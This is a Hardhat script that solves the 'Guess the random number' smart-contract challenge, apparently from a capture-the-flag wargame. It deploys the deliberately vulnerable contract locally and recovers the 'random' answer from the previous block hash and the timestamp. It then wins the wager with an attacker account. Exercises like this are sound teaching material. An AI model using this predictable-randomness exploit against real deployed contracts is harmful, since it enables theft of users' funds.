const { ethers } = require("hardhat");

async function main() {
  const [deployer, attacker] = await hre.ethers.getSigners();
  const GuessTheRandomNumberContract = await ethers.getContractFactory("GuessTheRandomNumberChallenge", deployer);
  const GuessTheRandomNumberContractHack = await ethers.getContractFactory("GuessTheRandomNumberChallengeHack", deployer);

  const mainContract = await GuessTheRandomNumberContract.deploy({ value: ethers.utils.parseEther("1") });
  const hackContract = await GuessTheRandomNumberContractHack.deploy();

  const blockBefore = await ethers.provider.getBlock(mainContract.deployTransaction.blockNumber - 1);
  const currentBlock = await ethers.provider.getBlock(mainContract.deployTransaction.blockNumber);
  const timestamp = currentBlock.timestamp;

  const val = await hackContract.getAnswer(blockBefore.hash, timestamp);
  await mainContract.connect(attacker).guess(val, { value: ethers.utils.parseEther("1.0") });

  console.log("Is completed:", await mainContract.isComplete());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
